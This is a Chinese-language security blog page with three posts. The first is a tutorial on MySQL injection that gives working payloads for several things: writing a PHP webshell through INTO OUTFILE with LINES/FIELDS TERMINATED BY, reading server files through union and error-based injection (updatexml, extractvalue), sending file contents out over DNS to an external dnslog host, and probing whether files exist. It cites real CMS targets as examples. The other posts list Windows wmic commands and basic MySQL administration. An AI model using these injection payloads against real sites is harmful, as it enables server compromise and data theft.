    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Itachi Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/26/mysql利用报错注入读取文件内容/" itemprop="url">mysql利用报错注入读取文件内容</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T19:18:04+08:00">
                2019-03-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>0x00 前言<br>近期分析mysql利用报错注入读取文件内容，利用LINES TERMINATED BY在查询只返回一个字段时写webshell文件，以及如何利用load_file扫描判断文件是否存在。<br>0x01 into outfile写文件<br>要求用户具有file权限<br>文件不能覆盖写入，所以文件必须为不存在<br>如果secure_file_priv非空，则写入文件的目录只能为对应目录下<br>注意:<br>FIELDS TERMINATED BY原理为在输出数据的每个字段之间插入webshell内容，所以如果select返回的只有一个字段，则写入的文件不包含webshell内容,例如下面语句SELECT username FROM user WHERE id = 1 into outfile ‘D:/1.php’ FIELDS TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e，写入的文件中只包含username的值而没有webshell内容;<br>LINES TERMINATED BY和LINES STARTING BY原理为在输出每条记录的结尾或开始处插入webshell内容，所以即使只查询一个字段也可以写入webshell内容，更为通用。此外，该类方式可以引用于limit等不能union的语句之后进行写文件操作。</p>
<ol>
<li>union注入写文件<br>SELECT * FROM user WHERE id = -1 union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile ‘D:/1.php’</li>
<li>FIELDS TERMINATED BY（可在limit等语句后）<br>SELECT * FROM user WHERE id = 1 into outfile ‘D:/1.php’ fields terminated by 0x3c3f70687020706870696e666f28293b3f3e</li>
<li>LINES TERMINATED BY（可用于limit等sql注入）<br>SELECT username FROM user WHERE id = 1 into outfile ‘D:/1.php’ LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e</li>
<li>LINES STARTING BY（可用于limit等sql注入）<br>SELECT username FROM user WHERE id = 1 into outfile ‘D:/2.php’ LINES STARTING  BY 0x3c3f70687020706870696e666f28293b3f3e<br>0x02 LOAD_FILE读文件<br>要求用户具有file权限<br>如果secure_file_priv非空，则只能读取对应目录下的文件</li>
<li>联合注入+load_file读文件<br>SELECT * FROM user WHERE id=-1 UNION select 1,’1’,(select load_file(‘D:/1.php’))</li>
<li>DNSLOG带外查询<br>需要windows环境<br>SELECT id FROM user WHERE id = load_file (concat(‘\\‘,hex((select load_file(‘D:/1.php’))),’.t00ls.xxxxxxxxx.tu4.org\a.txt’))</li>
<li><p>报错注入+load_file读文件<br>ps:<br>select * from user  where username = ‘’ and updatexml(0,concat(0x7e,(LOAD_FILE(‘D:/1.php’)),0x7e),0)</p>
<p>select <em> from user where id=1 and (extractvalue(1,concat(0x7e,(select (LOAD_FILE(‘D:/1.php’))),0x7e)))<br>某CMS报错注入读取文件实例1:<br>[img]<a href="http://blackwolfsec.cc/static/picture/mysql_file_1.png[/img]" target="_blank" rel="noopener">http://blackwolfsec.cc/static/picture/mysql_file_1.png[/img]</a><br>某CMS报错注入读取文件实例2:<br>[img]<a href="http://blackwolfsec.cc/static/picture/mysql_file_2.png[/img]" target="_blank" rel="noopener">http://blackwolfsec.cc/static/picture/mysql_file_2.png[/img]</a><br>0x03 扫描文件是否存在<br>要求用户具有file权限<br>如果secure_file_priv非空，则只能扫描判断对应目录下的文件<br>原理： load_file读取文件时，如果没有对应的权限获取或者文件不存在则函数返回NULL,所以结合isnull+load_file可以扫描判断文件名是否存在<br>如果文件存在，isnull(load_file(‘文件名’))返回0<br>mysql&gt; select </em> from user  where username = ‘’ and updatexml(0,concat(0x7e,isnull(LOAD_FILE(‘D:/1.php’)),0x7e),0);<br>ERROR 1105 (HY000): XPATH syntax error: ‘~0~’</p>
</li>
</ol>
<p>如果文件不存在isnull(load_file(‘文件名’))返回1<br>mysql&gt; select * from user  where username = ‘’ and updatexml(0,concat(0x7e,isnull(LOAD_FILE(‘D:/xxxxx’)),0x7e),0);<br>ERROR 1105 (HY000): XPATH syntax error: ‘~1~’<br>某CMS报错注入扫描文件实例，存在文件C:/Windows/win.ini<br>[img]<a href="http://blackwolfsec.cc/static/picture/mysql_file_3.png[/img]" target="_blank" rel="noopener">http://blackwolfsec.cc/static/picture/mysql_file_3.png[/img]</a><br>某CMS报错注入扫描文件实例，不存在文件C:/Windows/passwd<br>[img]<a href="http://blackwolfsec.cc/static/picture/mysql_file_4.png[/img]" target="_blank" rel="noopener">http://blackwolfsec.cc/static/picture/mysql_file_4.png[/img]</a> 可以结合burp爆破扫描文件名<br>[img]<a href="http://blackwolfsec.cc/static/picture/mysql_file_5.png[/img]" target="_blank" rel="noopener">http://blackwolfsec.cc/static/picture/mysql_file_5.png[/img]</a><br>0x04小结<br>倘若知道绝对路径且有权限时，通常都是直接into outfile写webshell<br>不知道网站绝对路径时，可以尝试读取常见的配置文件获取网站绝对路径，然后进行写操作；或者直接读取敏感的文件，获取信息进行其他操作。<br>此外load_file可以在盲注情况下，利用DNSLOG带外获取内容，或者hex()函数转换后按位读取敏感的文件内容<br>还有很多的利用技巧，大家自行研究，多多分享</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://1tachi.github.io/2019/03/26/win常用命令/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Itachi Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/26/win常用命令/" itemprop="url">windows常用命令收藏</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T19:18:04+08:00">
                2019-03-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="查看硬件信息"><a href="#查看硬件信息" class="headerlink" title="查看硬件信息"></a>查看硬件信息</h3><p>sysdm.cpl， 打开系统属性</p>
<p>dxdiag，打开DirectX诊断工具</p>
<p>msinfo32，打开系统信息</p>
<p>devmgmt.msc，打开设备管理</p>
<p>winver,查看系统版本</p>
<p>wmic diskdrive，可以看出牌子和大小</p>
<p>Wmic logicaldisk，可以看到有几个盘，每一个盘的文件系统和剩余空间</p>
<p>wmic volume，每个盘的剩余空间量</p>
<p>wmic cpu上面显示的有位宽，最大始终频率，生产厂商，二级缓存等信息</p>
<p>wmic memorychip可以显示出内存条数、容量和速度</p>
<p>wmic bios主板型号、BIOS 版本</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://1tachi.github.io/2019/03/26/mysql常用语句收藏/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Itachi Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/26/mysql常用语句收藏/" itemprop="url">mysql常用语句</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T19:18:04+08:00">
                2019-03-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="MySQL服务的配置和使用"><a href="#MySQL服务的配置和使用" class="headerlink" title="MySQL服务的配置和使用"></a>MySQL服务的配置和使用</h3><p>修改MySQL管理员的口令：mysqladmin –u root password 密码字符串<br>    如：mysqldmin –u root password 111111<br>连接MySQL服务器，使用命令： mysql [-h 主机名或IP地址] [-u 用户名] [-p]<br>    如：mysql –u root –p<br>如已有密码需修改root密码用命令: mysqladmin –u root –p password 新密码字符串<br>    如：mysqladmin –u root –p password 111111</p>
<h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><p><code>CREATE DATABASE 数据库名称；</code></p>
<p>如：<code>mysql&gt;create database abc;</code>   默认创建数据库保存在/var/lib/mysql中<br>查看数据库是  mysql&gt;show abc;<br>选择数据库是  USE 数据库名称; </p>
<p> 如：mysql&gt;use abc;<br>删除数据库是  DROP DATABASE 数据库名称；</p>
<p> 如：mysql&gt;drop database abc;</p>
<h3 id="数据库的创建和删除"><a href="#数据库的创建和删除" class="headerlink" title="数据库的创建和删除"></a>数据库的创建和删除</h3><p>创建表是 <code>CREATE TABLE 表名称(字段1，字段2，…[表级约束]) [TYPE=表类型]；</code><br>其中字段(1,2 )格式为:字段名 字段类型 [字段约束]<br>如创建一个表student，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;create table student (</span><br><span class="line">sno varchar(7) not null,   #字段不允许为空</span><br><span class="line">sname varchar (20 )not null,</span><br><span class="line">ssex char (1) default ‘t’,</span><br><span class="line">sbirthday date,</span><br><span class="line">sdepa char (20),</span><br><span class="line">primary key (sno)     # 表的主键</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>可用describe命令查看表的结构。<br>默认表的类型为MYISAM，并在/var/lib/mysql/abc 目录下建立student.frm(表定义文件)，student.MDY(数据文件)，stedent.MYI(索引文件)。<br>复制表 <code>CREATE TABLE 新表名称 LIKE 原表名称；</code><br>如：mysql&gt;create table xtable like student;<br>删除表<code>DROP TABLE 表名称1[表名称2…];</code><br>如：mysql&gt; drop table xtale;</p>
<h3 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h3><p><code>ALTER TABLE 表名称 更改动作1[动作2]；</code></p>
<p>动作有ADD(增加) DROP(删除)CHANGE、MODIFY(更改字段名和类型)RENAME</p>
<p>增加字段：</p>
<p><code>mysql&gt;alter table  student add saddress varchar(25);</code><br>更改字段名和字段类型：</p>
<p> <code>mysql&gt;alter table student change saddress sremark test;</code></p>
<p>即使不更改字段类型也要给出字段类型如：<br><code>mysql&gt;alter table student change saddress sremark varchar (25);</code><br>更改字段类型　：</p>
<p><code>mysql&gt; alter table student modify sremark varchar(25);</code><br>删除字段：</p>
<p><code>mysql&gt;alter table student drop sremark；</code><br>更改表名称： </p>
<p><code>mysql&gt;alter table student rename to xs；</code></p>
<h3 id="表中数据的插入、删除和修改"><a href="#表中数据的插入、删除和修改" class="headerlink" title="表中数据的插入、删除和修改"></a>表中数据的插入、删除和修改</h3><p> 插入记录：<code>INSERT INTO 表名称（字段名1,字段名2…)
               VALUES(字段1的值，字段2的值...);</code><br>   如：<code>mysql&gt;insert into student (sno,sname,ssex,sbirthday,sdepa)
             values(‘0321001’,’LiuTao’,dagault,19870201,’math’);</code><br>   查看表<code>mysql&gt;select * from student;</code><br>插入与前面相同的记录，可用insert命令的缩写格式，<br>如:<code>mysql&gt;insert into student values (‘0321001’, ‘Liu Tao’, default,
19870201, ‘mth’);</code><br>如果字段名列表中没有给出表中的某些字段，那么这些字段设置为默认值，<br>如：<code>mysql&gt;insert into student (sno,sname,sbirthday)
          values(‘0321002’,’Wang Jun’,1870112);</code><br>一个单独的insert语句中可使用多个valuse字句，插入多条记录，<br>如：<code>mysql&gt;insert into  student values
         (‘0322001’, ‘Zhang Liaoyun’, ‘f’1971102,’computer’),
         (‘0322002’, ‘Li Ming’, ‘t’1971105,’computer’);</code><br>   删除记录：<code>DELETE FROM 表名称 WHERE 条件表达式；</code><br>   如：<code>mysql&gt;delete from student where sno=’0321002’;</code><br>   删除student表中sno字段值前4位为‘0322’的记录<br>   如：<code>mysql&gt;delete from student where left (sno,4)=’0322’;</code><br>   删除所有记录，可以不带where字句<br>   如：<code>mysql&gt;delete from student;</code><br>   删除所以记录可以用命令<code>truncate</code>     删除表，然后重建表，所以比delete命令快<br>   如：<code>mysql&gt;truncate table student;</code><br>   修改记录 <strong>UPDATE 表名</strong>称 SET 字段名1=字段值1<br>            WHERE 条件表达式  </p>
<p> 如： <code>mysql&gt;update student set sbirthday=1920113, sdepa=’math’ where</code><br><code>sno=’0321002’;</code></p>
<h3 id="索引的创建与删除"><a href="#索引的创建与删除" class="headerlink" title="索引的创建与删除"></a>索引的创建与删除</h3><p>在创建表的同时创建索引</p>
<p> 创建表时，可用<strong>INDEX</strong>字句或<strong>UNIQUE</strong>(字段值必须惟一)字句创建索引<br>   如：<em>创建课程表course, 课程编号cno字段为主键，课程名称cname字段创建一个名为can的索引</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;create table course(</span><br><span class="line">cno varchar(5) not null,</span><br><span class="line">cname varchar(30) not null,</span><br><span class="line">teacher varchar(20),</span><br><span class="line">primary key (cno),</span><br><span class="line">index can (cname)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>向已存在的表添加索引   <strong>CREATE [UNIQUE] INDEX 索引名 ON 表名称 (字段名1 [(长度)])；</strong><br>   如：<code>mysql&gt;create index sna on student (sname);</code><br>   对于类型为<strong>CHAR和VARCHAR</strong>的字段建立索引时还可指定长度值，类型为BLOB和TEXT的字段索引时必须指定长度值。<br>   如<code>mysql&gt;create index sna on student (sname(10));</code><br>   删除索引  <strong>DROP INDEX 索引 ON 表名称；</strong><br>   如：<code>mysql&gt;drop index sna on student;</code></p>
<h3 id="用户的创建和删除"><a href="#用户的创建和删除" class="headerlink" title="用户的创建和删除"></a>用户的创建和删除</h3><p>初始化时有5个MySQL授权表，其中<em>host、tables_priv</em>和<em>columnts_priv</em> 是空的，表user和db决定了MySQL默认的访问规则。默认有<strong>mysql</strong>和<strong>test</strong>两个数据库。<br>授权表：</p>
<ul>
<li>user  用户从哪些主机可以连接到数据库服务器，以及对所以数据库的访问权限（全局权限）</li>
<li>db   用户可以使用哪些权限，以及对数据库执行哪些操作（数据库级权限）</li>
<li>host  当表db 中的host 字段值为空时，用户从哪些主机可以连接到数据库服务器。</li>
<li>tables_priv  连接的用户可以访问哪些表（表级权限）</li>
<li>columnts_priv  连接的用户可以访问哪些字段 （字段级权限）</li>
</ul>
<h3 id="创建新用户"><a href="#创建新用户" class="headerlink" title="创建新用户"></a>创建新用户</h3><p>以MySQL管理员连接到数据库服务器：<code>#mysql –u root –p</code><br>创建新用户guess并设置密码，同时可以从任何主机连接数据库服务器：<br><code>mysql&gt;insert into mysql.user (host,user,password)  values (‘%’,’gusee’,password(‘guest’));</code>    # 使用password()函数，密码是加密的<br>重载MySQL授权表：<code>mysql&gt;flush privileges;</code><br>远程客户端连接数据库服务器 ：</p>
<p><code>#mysql –h 192.168.0.50 –u guess –p</code>   </p>
<p>查看当前用户可用数据库： <strong>show database</strong></p>
<h4 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h4><p><code>mysql&gt;delete from mysql.user where user=’guest’;</code></p>
<h4 id="更改用户密码"><a href="#更改用户密码" class="headerlink" title="更改用户密码"></a>更改用户密码</h4><p>如：更改guset密码为123456<br><code>mysql&gt;update mysql.user set password=password(‘123456’)
      where user =’guset’;
mysql&gt;flush privileges;</code><br>或者是 <code>mysql&gt;set password for guset@’%’=password(‘123456’);</code></p>
<h3 id="用户权限的设置"><a href="#用户权限的设置" class="headerlink" title="用户权限的设置"></a>用户权限的设置</h3><p>   在表user、db和host中，所有字段声明为ENUM(‘N’,’Y’),默认是‘N’;<br>   在表tables_priv和columns_priv中，权限字段声明为SET类型<br>   修改授权表中的访问权限有两中方法，一是使用 <strong>INSERT、UPDATE和DELETE</strong>等DML语句，<br>   另一中是<strong>GRANT和GRVOKE</strong>语句<br>   使用GRANT语句授权：<br>   格式如下：<br>  <code>GRANT 权限列表 [(字段列表)] on 数据库名称.表名称  TO 用户名@域名或IP地址</code><br>  <code>[INDETIFIED BY ‘密码值’] [WITH CRANT OPTION];</code></p>
<p>授权哪个用户能连接，从哪连接<br>  如：授权用户guest从任意主机连接数据库服务器，并具有完全访问数据库abc的权限。<br>          Mysql&gt;grant all on abc.* to guset@’%’ identified by ‘guest’<br>   <strong>`注意几点</strong>`：</p>
<ol>
<li>如指定用户不存在，则创建该新用户；</li>
<li>‘权限列表’处ALL表示授予全部权限，USAGE表不授予任何权限。</li>
<li>‘数据库名称.表名称’处可以使用通配符“<em>”。如“abc.</em>” 表数据库abc中所有表</li>
<li>‘用户名@域名或IP地址’设置谁能连，从哪连。用户名 不能用通配符，但可以用‘ ’空字符串，表任何用户；域名或IP地址可以用通配符“%”，使用是用单引号括起来。<br>授权用户不同级别的访问权限<br>如：新建用户tom,能从子网192.168.16.0访问数据库服务器，可以读取数据库xsxk,并能修改表course 中字段teacher的值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;grant select on xsxd.* to tom@’192.168.16.%’ indentifiend by ‘123456’;</span><br><span class="line">mysql&gt;grant update(teacher) on xsxd.course to tom@’192.168.16.%’’</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>注意几点：</p>
<ol>
<li>数据库名称.表名称 用来设置权限运用的级别，有全局的（<em>.</em>）,指定数据库的（xsxd.*） 和指定表的（xsxd.student</li>
<li>字段列表 设置权限运用中指定的表中的哪些字段，如update(cname,teacher)</li>
<li>权限列表 指定的权限与权限运行的级别有关，如有写权限（FILE、PROCESS、RELOAD、SHUTDOWN）作为管理权限用于全局级别；对于<strong>字段级别</strong>只能指定SELECT、INSERT、UPDATE、REFERENCES</li>
</ol>
<h3 id="授予用户管理权限的权利"><a href="#授予用户管理权限的权利" class="headerlink" title="授予用户管理权限的权利"></a>授予用户管理权限的权利</h3><p>​    如：管理员授予拥护admin可以从本地连接数据库服务器，对数据库xsxk具有完全访问权限，并可以将拥有的权限赋予其他用户<br>  <code>mysql&gt;grant all on xsxd.* to admin@localhost indentified by ‘123456’ with grant option;</code><br>​    其中<strong>with grant option</strong> 子句表示拥护拥有的权限可以赋予其他用户。<br>​    <code>mysql&gt;qrant select on xsxd.student to bill@localhost;</code>  授予bill用户权限<br>​    <code>mysql&gt;show grants for admin@localhost;</code>   查看用户权限</p>
<p> <strong>使用REVOKE语句撤权</strong><br>    格式如下：<br>  <code>REVOKE 权限列表[(字段列表)] on数据库名称.表名称 FROM用户名@域名或IP地址</code><br>    如：撤消用户admin@localhost 对数据库xsxd的创建、删除数据库及表的权限，不撤消用户赋予其它用户的权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;revoke create,drop on xsxd.* from admin@localhost;</span><br><span class="line">mysql&gt;revoke grant option on xsxd.* from admin@localhost;</span><br></pre></td></tr></table></figure>
<p> <strong>使用REVOKE语句撤权</strong><br>    格式如下：<br>  <code>REVOKE 权限列表[(字段列表)] on数据库名称.表名称 FROM用户名@域名或IP地址</code><br>    如：撤消用户admin@localhost 对数据库xsxd的创建、删除数据库及表的权限，不撤消用户赋予其它用户的权限</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">John Doe</p>
              <p class="site-description motion-element" itemprop="description">The quieter you become, the more you are able to hear.</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">8</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">6</span>
                  <span class="site-state-item-name">tags</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
